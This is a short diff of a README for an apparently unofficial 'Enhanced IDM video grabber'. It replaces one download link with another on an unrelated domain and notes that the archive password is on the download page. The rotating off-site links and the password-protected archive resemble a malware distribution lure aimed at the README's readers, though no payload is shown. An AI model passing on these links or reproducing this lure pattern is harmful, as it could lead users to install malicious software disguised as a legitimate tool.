@@ -18,7 +18,7 @@ Enhanced IDM video grabber detecting streams on 200+ sites: YouTube, Vimeo, Twit
 
 ## Download
 
-[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/idmgrab2)
+[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/idmgrab2)
 
 > The archive password is shown on the download page.
 
